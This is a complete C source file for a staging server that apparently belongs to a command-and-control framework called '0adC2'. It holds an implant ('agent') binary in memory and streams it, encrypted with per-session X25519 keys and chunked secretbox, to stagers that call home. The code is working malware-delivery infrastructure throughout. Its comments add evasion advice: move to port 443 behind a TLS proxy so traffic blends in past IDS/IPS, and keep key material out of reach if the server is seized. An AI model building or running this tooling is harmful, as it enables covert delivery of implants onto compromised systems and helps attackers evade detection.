/*
 * stage_srv.c — 0adC2 Staging Server
 * ═══════════════════════════════════════════════════════════════════════════
 * ROLE IN ARCHITECTURE:
 *   stage_srv runs on the operator's infrastructure (C2 team server or a VPS).
 *   It holds the agent binary in memory and serves it securely to stagers that
 *   call home. Once a stager connects, stage_srv:
 *     1. Performs an ECDH key exchange → unique session_key for this transfer.
 *     2. Encrypts and streams the agent in 4KB chunks using secretbox (AEAD).
 *     3. Forks a child process per connection, so multiple stagers can be
 *        served simultaneously without blocking.
 *
 * DESIGN PRINCIPLES:
 *   Per-session ephemeral keypairs (forward secrecy):
 *     A NEW X25519 keypair is generated for EVERY incoming connection.
 *     If an attacker later compromises the stage_srv machine and retrieves
 *     its keys, they cannot decrypt previously recorded sessions — the
 *     private key for each session existed only during that session.
 *
 *   Chunk-based secretbox encryption:
 *     The agent is NOT sent as one big encrypted blob. It is split into
 *     4KB chunks, each independently encrypted with a fresh random nonce.
 *     WHY CHUNKS:
 *       - Memory efficient: only one chunk needs to be in memory at a time
 *         on the stager side (useful for small embedded targets).
 *       - Early error detection: MAC failure on chunk N aborts the transfer
 *         immediately rather than after receiving the entire binary.
 *       - No length-extension vulnerability: each chunk is self-contained.
 *
 *   Agent loaded into RAM at startup (not read per-connection):
 *     g_agent_data is mmap'd / malloc'd once. All child processes share
 *     the read-only copy via fork() copy-on-write semantics. This avoids
 *     repeated disk reads and reduces the attack surface if the binary path
 *     is somehow guessable.
 *
 * Usage: ./stage_srv <agent_binary> [port]
 *        Default port: 20596
 *
 * Note: in production, consider running behind port 443 with a TLS-aware
 * reverse proxy if the target environment has a TLS-inspecting IDS/IPS.
 * The secretbox layer already provides confidentiality and integrity, but
 * port 20596 stands out on a firewall log whereas 443 blends in.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <time.h>
#include <sodium.h>

/* CHUNK_SIZE: 4096 bytes of plaintext per secretbox chunk.
 * The encrypted form is CHUNK_SIZE + 24 (nonce) + 16 (MAC) = 4136 bytes max.
 * This fits comfortably in a single TCP segment on most networks (MTU ~1500
 * gives ~1460 bytes per segment; 4136 bytes = ~3 segments, still manageable).
 * Larger chunks would be more efficient but reduce the granularity of error
 * detection and increase peak RAM usage on the stager side. */
#define DEFAULT_PORT 20596
#define CHUNK_SIZE   4096

static uint8_t *g_agent_data=NULL;
static size_t   g_agent_sz=0;

static int recv_exact(int fd, void *buf, size_t len){
    size_t got=0;
    while(got<len){
        ssize_t n=recv(fd,(uint8_t*)buf+got,len-got,MSG_WAITALL);
        if(n<=0) return -1;got+=(size_t)n;}
    return 0;}
static int send_all(int fd, const void *buf, size_t len){
    size_t sent=0;
    while(sent<len){
        ssize_t n=send(fd,(const uint8_t*)buf+sent,len-sent,0);
        if(n<=0) return -1;sent+=(size_t)n;}
    return 0;}

/* handle_client — per-connection handler (runs in a child process after fork)
 * ─────────────────────────────────────────────────────────────────────────── */
static void handle_client(int cfd, struct sockaddr_in *cli){
    char ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET,&cli->sin_addr,ip,sizeof(ip));
    printf("[stage_srv] connection: %s\n",ip);fflush(stdout);

    /* ── Ephemeral X25519 keypair — forward secrecy ──────────────────────────
     * Generate a BRAND NEW keypair for this specific connection.
     * WHY: if stage_srv is seized tomorrow, the key material for today's
     * sessions no longer exists — it was generated in RAM and was never
     * persisted. An adversary with the disk image of stage_srv cannot
     * decrypt previously captured stager → stage_srv traffic.
     * This property is called "Perfect Forward Secrecy" (PFS).
     *
     * srv_priv: 32 random bytes (secret scalar for Curve25519).
     * srv_pub:  32-byte public key = curve25519_base(srv_priv).
     * ──────────────────────────────────────────────────────────────────── */
    uint8_t srv_priv[32],srv_pub[32];
    randombytes_buf(srv_priv,32);
    crypto_scalarmult_curve25519_base(srv_pub,srv_priv);

    /* Receive stager public key (32 bytes).
     * The stager sends this first, before we reveal our public key.
     * Order doesn't matter cryptographically, but receiving first lets us
     * validate the stager is responsive before committing to the transfer. */
    uint8_t st_pub[32];
    if(recv_exact(cfd,st_pub,32)<0) goto done;

    /* ── Derive shared session_key (same formula as stager.c) ───────────────
     * shared       = X25519(srv_priv, st_pub)  ← DH shared secret
     * session_key  = SHA-256(shared ‖ st_pub ‖ srv_pub)
     *
     * Both sides perform identical computation and arrive at the same key.
     * The stager uses (st_priv, srv_pub) and gets the same shared value
     * because X25519(a, B) == X25519(b, A) when B=base(b) and A=base(a).
     *
     * Wiping shared and cat immediately after KDF: the raw DH output and
     * concatenated input are no longer needed. Zeroing them prevents their
     * recovery from a memory dump or core file.
     * ──────────────────────────────────────────────────────────────────── */
    uint8_t shared[32],sess_key[32];
    if(crypto_scalarmult_curve25519(shared,srv_priv,st_pub)!=0) goto done;
    {uint8_t cat[96];
    memcpy(cat,shared,32);memcpy(cat+32,st_pub,32);memcpy(cat+64,srv_pub,32);
    crypto_hash_sha256(sess_key,cat,96);
    sodium_memzero(shared,32);sodium_memzero(cat,96);}

    /* Send server public key + total plaintext size.
     * htonl: host byte order → network byte order (big-endian, per TCP convention).
     * The stager uses ntohl() to reverse this on receipt. */
    uint32_t total_be=htonl((uint32_t)g_agent_sz);
    if(send_all(cfd,srv_pub,32)<0) goto done;
    if(send_all(cfd,&total_be,4)<0) goto done;

    /* ── Chunk-by-chunk secretbox encryption and transmission ────────────────
     * For each 4KB slice of the agent binary:
     *   1. Generate a random 24-byte nonce (unique per chunk).
     *      CRITICAL: nonce must be unique for every call with the same key.
     *      Using randombytes_buf() here is the simplest safe approach.
     *   2. Encrypt: crypto_secretbox_easy() does XSalsa20 encryption + Poly1305 MAC.
     *      Layout of 'enc' buffer:
     *        [0 .. 23]  : nonce (24 bytes, placed first so receiver can extract it)
     *        [24 .. 39] : Poly1305 MAC tag (16 bytes)
     *        [40 .. N]  : ciphertext (same length as plaintext)
     *   3. Prepend a 4-byte big-endian length field so the stager knows how
     *      many bytes to read for this chunk before decrypting.
     *   4. Send length field + encrypted chunk.
     *
     * WHY NOT ONE BIG BLOB:
     *   - The stager's malloc() call is bounded to one chunk at a time (max ~4KB).
     *   - Stager can detect corruption early (chunk 1 fails → no need to receive rest).
     *   - Keeps peak memory usage low on both sides.
     * ──────────────────────────────────────────────────────────────────── */
    size_t offset=0;size_t chunk_idx=0;
    while(offset<g_agent_sz){
        size_t csz=((g_agent_sz-offset)>CHUNK_SIZE)?CHUNK_SIZE:(g_agent_sz-offset);
        size_t enc_len=crypto_secretbox_NONCEBYTES+crypto_secretbox_MACBYTES+csz;
        uint8_t *enc=(uint8_t*)malloc(enc_len);
        if(!enc) goto done;

        /* Generate a fresh random nonce at the start of the enc buffer */
        randombytes_buf(enc,crypto_secretbox_NONCEBYTES);
        /* Encrypt plaintext into enc[NONCE_BYTES..], prepending the MAC */
        crypto_secretbox_easy(
            enc+crypto_secretbox_NONCEBYTES,    /* output: mac + ciphertext */
            g_agent_data+offset, csz,           /* plaintext slice */
            enc,                                /* nonce (from start of buffer) */
            sess_key);                          /* derived session key */

        /* Send length prefix then the encrypted chunk */
        uint32_t elen_be=htonl((uint32_t)enc_len);
        if(send_all(cfd,&elen_be,4)<0){free(enc);goto done;}
        if(send_all(cfd,enc,(size_t)enc_len)<0){free(enc);goto done;}
        free(enc);
        offset+=csz;chunk_idx++;
        printf("[stage_srv] chunk %zu — %zu/%zu bytes sent\n",
               chunk_idx,offset,g_agent_sz);fflush(stdout);}

    printf("[stage_srv] %s — transfer OK (%zu bytes)\n",ip,g_agent_sz);fflush(stdout);
done:
    /* Always wipe sensitive key material before closing, even on error paths */
    sodium_memzero(sess_key,32);
    sodium_memzero(srv_priv,32);
    close(cfd);}

int main(int argc, char *argv[]){
    if(argc<2){
        fprintf(stderr,"Usage: %s <agent_binary> [port]\n",argv[0]);return 1;}
    int port=(argc>2)?atoi(argv[2]):DEFAULT_PORT;

    if(sodium_init()<0){fputs("libsodium init\n",stderr);return 1;}
    /* SIGPIPE: if a stager disconnects mid-transfer, send() would raise SIGPIPE
     * and kill the child process. SIG_IGN causes send() to return -1 instead,
     * which we handle gracefully by jumping to 'done'. */
    signal(SIGPIPE,SIG_IGN);
    /* SIGCHLD: when a forked child exits, the OS sends SIGCHLD to the parent.
     * SIG_IGN tells the kernel to auto-reap zombie child processes without us
     * having to call wait(). Prevents accumulation of zombie PIDs over time. */
    signal(SIGCHLD,SIG_IGN);

    /* Load agent binary into memory once at startup.
     * All fork()ed children share this mapping via copy-on-write. No repeated
     * disk I/O per connection. The file handle is closed immediately after load
     * — even if the binary is deleted from disk, we still have it in RAM. */
    FILE *f=fopen(argv[1],"rb");
    if(!f){perror(argv[1]);return 1;}
    fseek(f,0,SEEK_END);long fsz=ftell(f);rewind(f);
    if(fsz<=0){fputs("empty file\n",stderr);return 1;}
    g_agent_data=(uint8_t*)malloc((size_t)fsz);
    fread(g_agent_data,1,(size_t)fsz,f);fclose(f);
    g_agent_sz=(size_t)fsz;

    printf("[stage_srv] agent: %s (%zu bytes)\n",argv[1],g_agent_sz);

    /* ── TCP listener setup ──────────────────────────────────────────────────
     * SO_REUSEADDR: allows rebinding to the same port immediately after restart,
     *   bypassing the kernel's TIME_WAIT delay (usually 60 s). Without this,
     *   restarting stage_srv within a minute of stopping it would fail with
     *   "Address already in use".
     * listen(srv, 8): allow up to 8 pending connections in the accept queue
     *   before the kernel starts refusing new ones. Fine for Red Team ops
     *   where stagers are few and not all arriving simultaneously.
     * ──────────────────────────────────────────────────────────────────── */
    int srv=socket(AF_INET,SOCK_STREAM,0);
    int opt=1;setsockopt(srv,SOL_SOCKET,SO_REUSEADDR,&opt,sizeof(opt));
    struct sockaddr_in sa={0};
    sa.sin_family=AF_INET;sa.sin_port=htons((uint16_t)port);
    sa.sin_addr.s_addr=INADDR_ANY;  /* bind on all interfaces (0.0.0.0) */
    if(bind(srv,(struct sockaddr*)&sa,sizeof(sa))<0){perror("bind");return 1;}
    listen(srv,8);
    printf("[stage_srv] listening on :%d — waiting for stagers...\n",port);
    fflush(stdout);

    /* ── Accept loop: fork per connection ────────────────────────────────────
     * fork() creates a child process that is an exact copy of the parent.
     * The child handles one stager from start to finish, then exits.
     * The parent immediately loops back to accept() the next connection.
     * WHY FORK vs THREADS: simpler isolation — a crash in one child cannot
     * corrupt another child's session key or stack. The trade-off is higher
     * memory overhead per connection (full process copy), acceptable here.
     *
     * After fork():
     *   Child  (fork()==0): close the listening socket (it doesn't need it)
     *                       and handle the client, then exit.
     *   Parent (fork()>0):  close the client socket (child owns it now)
     *                       and loop to accept the next connection.
     * ──────────────────────────────────────────────────────────────────── */
    while(1){
        struct sockaddr_in cli={0};socklen_t clen=sizeof(cli);
        int cfd=accept(srv,(struct sockaddr*)&cli,&clen);
        if(cfd<0) continue;
        if(fork()==0){
            close(srv);              /* child doesn't need the listening socket */
            handle_client(cfd,&cli);
            exit(0);}
        close(cfd);}  /* parent closes its copy of the client fd (child still has it) */

    free(g_agent_data);close(srv);return 0;}
